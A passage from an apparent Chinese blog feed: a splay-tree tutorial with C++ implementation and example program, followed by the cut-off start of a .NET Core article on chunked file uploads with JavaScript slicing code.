&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808095912599-30596745.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面举一个例子来体会上面的伸展操作。&lt;/p&gt;
&lt;p&gt;如下图所示，最左边的一个单链先执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(1, S)}\)&lt;/span&gt;，我们将元素 &lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt; 调整到了伸展树的根部。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808103454522-1224295219.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;执行几次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(1, S)}\)&lt;/span&gt; 的效果&lt;/p&gt;
&lt;p&gt;然后再执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(2, S)}\)&lt;/span&gt;，将元素 &lt;span class=&quot;math inline&quot;&gt;\(2\)&lt;/span&gt; 调整到伸展树 &lt;span class=&quot;math inline&quot;&gt;\(\text{S}\)&lt;/span&gt; 的根部。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808104038181-1680770944.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;执行几次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(2, S)}\)&lt;/span&gt; 的效果&lt;/p&gt;
&lt;h3 id=&quot;12-伸展树的基本操作&quot;&gt;1.2 伸展树的基本操作&lt;/h3&gt;
&lt;p&gt;利用伸展树 Splay ，我们可以在伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt; 上进行如下几种基本操作。&lt;/p&gt;
&lt;h4 id=&quot;（1）-：判断元素--是否在伸展树--表示的有序集中。&quot;&gt;（1） &lt;span class=&quot;math inline&quot;&gt;\(\text{Find(x, S)}\)&lt;/span&gt;：判断元素 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 是否在伸展树 &lt;span class=&quot;math inline&quot;&gt;\(\text{S}\)&lt;/span&gt; 表示的有序集中。&lt;/h4&gt;
&lt;p&gt;首先，与在二叉排序树中进行查找操作操作一样，在伸展树中查找元素 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt;。如果 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 在树中，则再执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(x, S)}\)&lt;/span&gt; 调整伸展树。&lt;/p&gt;
&lt;h4 id=&quot;（2）-：将元素--插入到伸展树--表示的有序集中。&quot;&gt;（2） &lt;span class=&quot;math inline&quot;&gt;\(\text{Insert(x, S)}\)&lt;/span&gt;：将元素 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 插入到伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt; 表示的有序集中。&lt;/h4&gt;
&lt;p&gt;首先，与在二叉排序树中进行插入操作一样，将 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 插入到伸展树 &lt;span class=&quot;math inline&quot;&gt;\(\text{S}\)&lt;/span&gt; 中的相应位置，再执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(x, S)}\)&lt;/span&gt; 调整伸展树。&lt;/p&gt;
&lt;h4 id=&quot;（3）-：将两棵伸展树--与--合并成为一棵伸展树。其中，-的所有元素都小于--的所有元素。&quot;&gt;（3） &lt;span class=&quot;math inline&quot;&gt;\(\text{Join(S1, S2)}\)&lt;/span&gt;：将两棵伸展树 &lt;span class=&quot;math inline&quot;&gt;\(\text{S1}\)&lt;/span&gt; 与 &lt;span class=&quot;math inline&quot;&gt;\(\text{S2}\)&lt;/span&gt; 合并成为一棵伸展树。其中，&lt;span class=&quot;math inline&quot;&gt;\(S1\)&lt;/span&gt; 的所有元素都小于 &lt;span class=&quot;math inline&quot;&gt;\(S2\)&lt;/span&gt; 的所有元素。&lt;/h4&gt;
&lt;p&gt;首先，找到伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S1\)&lt;/span&gt; 中最大的一个元素 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt;，再通过 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(x, S1)}\)&lt;/span&gt; 将 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 调整到伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S1\)&lt;/span&gt; 的根部。然后将 &lt;span class=&quot;math inline&quot;&gt;\(S2\)&lt;/span&gt; 作为 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 节点的右子树插入，这样就得到了新的伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt;，如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808111536091-1717629423.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;span class=&quot;math inline&quot;&gt;\(\text{Join(S1, S2)}\)&lt;/span&gt; 的两个步骤&lt;/p&gt;
&lt;h4 id=&quot;（4）：将元素--从伸展树--所表示的有序集中删除。&quot;&gt;（4）&lt;span class=&quot;math inline&quot;&gt;\(\text{Delete(x, S)}\)&lt;/span&gt;：将元素 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt; 从伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt; 所表示的有序集中删除。&lt;/h4&gt;
&lt;p&gt;首先，执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Find(x, S)}\)&lt;/span&gt; 将 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 调整为根节点，然后再对左右子树执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Join(S1, S2)}\)&lt;/span&gt; 操作即可。&lt;/p&gt;
&lt;h4 id=&quot;（5）：以--为界，将伸展树--分离为两棵伸展树--和-，其中，-的所有元素都小于-，-的所有元素都大于-。&quot;&gt;（5）&lt;span class=&quot;math inline&quot;&gt;\(\text{Split(x, S)}\)&lt;/span&gt;：以 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt; 为界，将伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt; 分离为两棵伸展树 &lt;span class=&quot;math inline&quot;&gt;\(S1\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(S2\)&lt;/span&gt;，其中，&lt;span class=&quot;math inline&quot;&gt;\(S1\)&lt;/span&gt; 的所有元素都小于 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;，&lt;span class=&quot;math inline&quot;&gt;\(S2\)&lt;/span&gt; 的所有元素都大于 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;。&lt;/h4&gt;
&lt;p&gt;首先，执行 &lt;span class=&quot;math inline&quot;&gt;\(\text{Find(x, S)}\)&lt;/span&gt; 将 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 调整为根节点，则 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 的左子树就是 &lt;span class=&quot;math inline&quot;&gt;\(\text{S1}\)&lt;/span&gt;，右子树就是 &lt;span class=&quot;math inline&quot;&gt;\(\text{S2}\)&lt;/span&gt;。如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808112315448-202830434.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;除了上述介绍的 &lt;span class=&quot;math inline&quot;&gt;\(5\)&lt;/span&gt; 种基本操作外，伸展树还支持求最大值、最小值、求前趋、求后继等多种操作，这些操作也都是建立在伸展树操作 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay}\)&lt;/span&gt; 的基础之上的。&lt;/p&gt;
&lt;h2 id=&quot;2-伸展树的算法实现&quot;&gt;2. 伸展树的算法实现&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;注：这里的代码并不是最简单的代码，而是基于上述思想实现的代码，更方便我们结合之前分析的内容来理解。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;下面给出伸展树的各种操作的算法实现，它们都是基于如下伸展树的类型定义：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int lson[maxn], // 左儿子编号
    rson[maxn], // 右儿子编号
    p[maxn],    // 父节点编号
    val[maxn],  // 节点权值
    sz;         // 编号范围 [1, sz]

struct Splay {
    int rt; // 根节点编号
    void zag(int x);    // 左旋
    void zig(int x);    // 右旋
    void splay(int x);  // 伸展操作：将x移到根节点
    int func_find(int v);   // 查找是否存在值为v的节点
    void func_insert(int v);    // 插入
    void func_delete(int v);    // 删除
    int get_max();  // 求最大值
    int get_min();  // 求最小值
    int get_pre(int v); // 求前趋
    int get_suc(int v); // 求后继
    int join(int rt1, int rt2); // 合并
} tree;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;1-左旋操作&quot;&gt;1. 左旋操作&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;void Splay::zag(int x) {
    int y = p[x], z = p[y], a = lson[x];
    lson[x] = y; p[y] = x;
    rson[y] = a; p[a] = y;
    p[x] = z;
    if (z) {
        if (lson[z] == y) lson[z] = x;
        else rson[z] = x;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808143324013-4128882.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;Zag(x)操作&lt;/p&gt;
&lt;h4 id=&quot;2-右旋操作&quot;&gt;2. 右旋操作&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;void Splay::zig(int x) {
    int y = p[x], z = p[y], a = rson[x];
    rson[x] = y; p[y] = x;
    lson[y] = a; p[a] = y;
    p[x] = z;
    if (z) {
        if (lson[z] == y) lson[z] = x;
        else rson[z] = x;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808143132024-806042686.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;Zig(x)操作&lt;/p&gt;
&lt;h4 id=&quot;3-伸展操作&quot;&gt;3. 伸展操作&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;void Splay::splay(int x) {
    while (p[x]) {
        int y = p[x], z = p[y];
        if (!z) {
            if (x == lson[y]) zig(x);
            else zag(x);
        }
        else if (lson[y] == x) {
            if (lson[z] == y) { // zig-zig
                zig(y);
                zig(x);
            }
            else {  // zig-zag
                zig(x);
                zag(x);
            }
        }
        else {  // rson[y] == x
            if (lson[z] == y) { // zag-zig
                zag(x);
                zig(x);
            }
            else {  // zag-zag
                zag(y);
                zag(x);
            }
        }
    }
    rt = x;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;4-查找&quot;&gt;4. 查找&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::func_find(int v) {
    int x = rt;
    while (x) {
        if (val[x] == v) {
            rt = x;
            splay(x);
            return x;
        }
        else if (v &amp;lt; val[x]) x = lson[x];
        else x = rson[x];
    }
    return 0;   // 返回0说明没找到
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;5-插入&quot;&gt;5. 插入&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;void Splay::func_insert(int v) {
    val[++sz] = v;
    if (rt == 0) {
        rt = sz;
        return;
    }
    int x = rt;
    while (true) {
        if (v &amp;lt; val[x]) {
            if (lson[x]) x = lson[x];
            else {
                lson[x] = sz;
                p[sz] = x;
                break;
            }
        }
        else {
            if (rson[x]) x = rson[x];
            else {
                rson[x] = sz;
                p[sz] = x;
                break;
            }
        }
    }
    splay(rt = sz);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6-删除（会用到下面定义的join操作）&quot;&gt;6. 删除（会用到下面定义的join操作）&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;void Splay::func_delete(int v) {
    int x = func_find(v);
    if (!x) return;
    int ls = lson[x], rs = rson[x];
    lson[x] = rson[x] = 0;
    p[ls] = p[rs] = 0;
    rt = join(ls, rs);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;7-求最大值&quot;&gt;7. 求最大值&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::get_max() {
    if (!rt) return 0;
    int x = rt;
    while (rson[x]) x = rson[x];
    splay(rt = x);
    return x;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;8-求最小值&quot;&gt;8. 求最小值&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::get_min() {
    if (!rt) return 0;
    int x = rt;
    while (lson[x]) x = lson[x];
    splay(rt = x);
    return x;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;9-求前趋&quot;&gt;9. 求前趋&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::get_pre(int v) {
    if (!rt) return 0;
    int x = rt, ans = 0;
    while (true) {
        if (val[x] &amp;lt;= v) {
            if (!ans || val[ans] &amp;lt; val[x]) ans = x;
            if (rson[x]) x = rson[x];
            else break;
        }
        else {
            if (lson[x]) x = lson[x];
            else break;
        }
    }
    if (ans) splay(rt = ans);
    return ans;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;10-求后继&quot;&gt;10. 求后继&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::get_suc(int v) {
    if (!rt) return 0;
    int x = rt, ans = 0;
    while (true) {
        if (val[x] &amp;gt;= v) {
            if (!ans || val[ans] &amp;gt; val[x]) ans = x;
            if (lson[x]) x = lson[x];
            else break;
        }
        else {
            if (rson[x]) x = rson[x];
            else break;
        }
    }
    if (ans) splay(rt = ans);
    return ans;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;11-合并&quot;&gt;11. 合并&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;int Splay::join(int rt1, int rt2) {
    if (!rt1) return rt2;
    if (!rt2) return rt1;
    Splay tree1;
    tree1.rt = rt1;
    rt1 = tree1.get_max();
    assert(rson[rt1] == 0);
    rson[rt1] = rt2;
    p[rt2] = rt1;
    return rt1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;示例代码（对应题目：《怪物仓库管理员（二）》）：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
const int maxn = 500050;
int lson[maxn], // 左儿子编号
    rson[maxn], // 右儿子编号
    p[maxn],    // 父节点编号
    val[maxn],  // 节点权值
    sz;         // 编号范围 [1, sz]

struct Splay {
    int rt; // 根节点编号
    void zag(int x);    // 左旋
    void zig(int x);    // 右旋
    void splay(int x);  // 伸展操作：将x移到根节点
    int func_find(int v);   // 查找是否存在值为v的节点
    void func_insert(int v);    // 插入
    void func_delete(int v);    // 删除
    int get_max();  // 求最大值
    int get_min();  // 求最小值
    int get_pre(int v); // 求前趋
    int get_suc(int v); // 求后继
    int join(int rt1, int rt2); // 合并
} tree;

/**
    zag(int x) 左旋
*/
void Splay::zag(int x) {
    int y = p[x], z = p[y], a = lson[x];
    lson[x] = y; p[y] = x;
    rson[y] = a; p[a] = y;
    p[x] = z;
    if (z) {
        if (lson[z] == y) lson[z] = x;
        else rson[z] = x;
    }
}

/**
    zig(int x) 右旋
*/
void Splay::zig(int x) {
    int y = p[x], z = p[y], a = rson[x];
    rson[x] = y; p[y] = x;
    lson[y] = a; p[a] = y;
    p[x] = z;
    if (z) {
        if (lson[z] == y) lson[z] = x;
        else rson[z] = x;
    }
}

/**
    splay(int x) 伸展操作
*/
void Splay::splay(int x) {
    while (p[x]) {
        int y = p[x], z = p[y];
        if (!z) {
            if (x == lson[y]) zig(x);
            else zag(x);
        }
        else if (lson[y] == x) {
            if (lson[z] == y) { // zig-zig
                zig(y);
                zig(x);
            }
            else {  // zig-zag
                zig(x);
                zag(x);
            }
        }
        else {  // rson[y] == x
            if (lson[z] == y) { // zag-zig
                zag(x);
                zig(x);
            }
            else {  // zag-zag
                zag(y);
                zag(x);
            }
        }
    }
    rt = x;
}

int Splay::func_find(int v) {
    int x = rt;
    while (x) {
        if (val[x] == v) {
            rt = x;
            splay(x);
            return x;
        }
        else if (v &amp;lt; val[x]) x = lson[x];
        else x = rson[x];
    }
    return 0;   // 返回0说明没找到
}

void Splay::func_insert(int v) {
    val[++sz] = v;
    if (rt == 0) {
        rt = sz;
        return;
    }
    int x = rt;
    while (true) {
        if (v &amp;lt; val[x]) {
            if (lson[x]) x = lson[x];
            else {
                lson[x] = sz;
                p[sz] = x;
                break;
            }
        }
        else {
            if (rson[x]) x = rson[x];
            else {
                rson[x] = sz;
                p[sz] = x;
                break;
            }
        }
    }
    splay(rt = sz);
}

void Splay::func_delete(int v) {
    int x = func_find(v);
    if (!x) return;
    int ls = lson[x], rs = rson[x];
    lson[x] = rson[x] = 0;
    p[ls] = p[rs] = 0;
    rt = join(ls, rs);
}

int Splay::get_max() {
    if (!rt) return 0;
    int x = rt;
    while (rson[x]) x = rson[x];
    splay(rt = x);
    return x;
}

int Splay::get_min() {
    if (!rt) return 0;
    int x = rt;
    while (lson[x]) x = lson[x];
    splay(rt = x);
    return x;
}

int Splay::get_pre(int v) {
    if (!rt) return 0;
    int x = rt, ans = 0;
    while (true) {
        if (val[x] &amp;lt;= v) {
            if (!ans || val[ans] &amp;lt; val[x]) ans = x;
            if (rson[x]) x = rson[x];
            else break;
        }
        else {
            if (lson[x]) x = lson[x];
            else break;
        }
    }
    if (ans) splay(rt = ans);
    return ans;
}

int Splay::get_suc(int v) {
    if (!rt) return 0;
    int x = rt, ans = 0;
    while (true) {
        if (val[x] &amp;gt;= v) {
            if (!ans || val[ans] &amp;gt; val[x]) ans = x;
            if (lson[x]) x = lson[x];
            else break;
        }
        else {
            if (rson[x]) x = rson[x];
            else break;
        }
    }
    if (ans) splay(rt = ans);
    return ans;
}

int Splay::join(int rt1, int rt2) {
    if (!rt1) return rt2;
    if (!rt2) return rt1;
    Splay tree1;
    tree1.rt = rt1;
    rt1 = tree1.get_max();
    assert(rson[rt1] == 0);
    rson[rt1] = rt2;
    p[rt2] = rt1;
    return rt1;
}

int n, op, x;

int main() {
    cin &amp;gt;&amp;gt; n;
    while (n --) {
        cin &amp;gt;&amp;gt; op;
        if (op != 3 &amp;amp;&amp;amp; op != 4) cin &amp;gt;&amp;gt; x;
        if (op == 1) tree.func_insert(x);
        else if (op == 2) tree.func_delete(x);
        else if (op == 3) cout &amp;lt;&amp;lt; val[tree.get_min()] &amp;lt;&amp;lt; endl;
        else if (op == 4) cout &amp;lt;&amp;lt; val[tree.get_max()] &amp;lt;&amp;lt; endl;
        else if (op == 5) cout &amp;lt;&amp;lt; val[tree.get_pre(x)] &amp;lt;&amp;lt; endl;
        else cout &amp;lt;&amp;lt; val[tree.get_suc(x)] &amp;lt;&amp;lt; endl;
    }
    return 0;
}
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sat, 08 Aug 2020 12:22:00 +0000</pubDate>
<dc:creator>quanjun</dc:creator>
<og:description>二叉排序树能够支持多种动态集合操作，它可以被用来表示有序集合，建立索引或优先队列等。因此，在信息学竞赛中，二叉排序树应用非常广泛。 作用于二叉排序树上的基本操作，其时间复杂度均与树的高度成正比，对于一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/quanjun/p/13460167.html</dc:identifier>
</item>
<item>
<title>.NET Core Web APi大文件分片上传研究 - Jeffcky</title>
<link>http://www.cnblogs.com/CreateMyself/p/13458917.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CreateMyself/p/13458917.html</guid>
<description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;前两天发表利用FormData进行文件上传，然后有人问要是大文件几个G上传怎么搞，常见的不就是分片再搞下断点续传，动动手差不多也能搞出来，只不过要深入的话，考虑的东西还是很多。由于断点续传之前写个几篇，这里试试利用FormData来进行分片上传。&lt;/p&gt;
&lt;h2&gt;.NET Core Web APi文件分片上传&lt;/h2&gt;
&lt;p&gt;这里我们依然是使用FormData来上传，只不过在上传之前对文件进行分片处理，如下HTML代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-horizontal&quot;&lt;/span&gt;&lt;span&gt; style&lt;/span&gt;&lt;span&gt;=&quot;margin-top:80px;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;col-md-10&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;file&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;file&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;file&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;col-md-offset-2 col-md-10&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;上传&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;btn btn-success&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接下来则是上传脚本，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
    $(&lt;/span&gt;'#submit').click(&lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
        UploadFile($(&lt;/span&gt;'#file')[0&lt;span&gt;].files);
    });
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;简单来说只需实现上述UploadFile方法，对大文件进行分片处理，然后上传就完事，文件上传后大致如下图所示，最后只需将所有文件进行合并处理为目标文件即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202008/589642-20200808184709922-785904872.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们详细讲讲如何实现，当然重点就在于如何进行分片处理，我们拿到上传目标文件，然后通过slice方法进行分片，在分片处理之前我们定义缓冲区大小（默认为8兆），然后循环遍历文件大小，然后将分片数据塞入分片数组，最后利用循环或者队列先进先出机制获取数组分片元素上传。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; UploadFile(targetFile) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建上传文件分片缓冲区&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; fileChunks =&lt;span&gt; [];
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 目标文件&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; file = targetFile[0&lt;span&gt;];
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置分片缓冲区大小&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; maxFileSizeMB = 8&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; bufferChunkSize = maxFileSizeMB * (1024 * 1024&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取文件流起始位置&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; fileStreamPos = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置下一次读取缓冲区初始大小&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; endPos =&lt;span&gt; bufferChunkSize;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 文件大小&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; size =&lt;span&gt; file.size;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将文件进行循环分片处理塞入分片数组&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (fileStreamPos &amp;lt;&lt;span&gt; size) {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; fileChunkInfo =&lt;span&gt; {
                file: file.slice(fileStreamPos, endPos),
                start: fileStreamPos,
                end: endPos
            }
            fileChunks.push(fileChunkInfo);
            fileStreamPos &lt;/span&gt;=&lt;span&gt; endPos;
            endPos &lt;/span&gt;= fileStreamPos +&lt;span&gt; bufferChunkSize;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取上传文件分片总数量&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; totalParts =&lt;span&gt; fileChunks.length;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; partCount = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 循环调用上传每一片&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt; (chunk =&lt;span&gt; fileChunks.shift()) {
            partCount&lt;/span&gt;++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 上传文件命名约定&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; filePartName = file.name + &quot;.partNumber-&quot; +&lt;span&gt; partCount;
            chunk.filePartName &lt;/span&gt;=&lt;span&gt; filePartName;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; url参数&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; url = 'partNumber=' + partCount + '&amp;amp;chunks=' + totalParts + '&amp;amp;size=' + bufferChunkSize + '&amp;amp;start=' + chunk.start + '&amp;amp;end=' + chunk.end + '&amp;amp;total=' +&lt;span&gt; size;
            chunk.urlParameter &lt;/span&gt;=&lt;span&gt; url;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 上传文件&lt;/span&gt;
&lt;span&gt;            UploadFileChunk(chunk);
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上述关于分片塞入数组就不用再废话，这里我们将每一片文件命名先进行一个约定（文件名+“.partNumber” + 分片号），以便所有分片上传完成后获取按照文件名中的分片号对其进行排序合并，这也就是合并文件的依据。接下来就是上传每一片文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
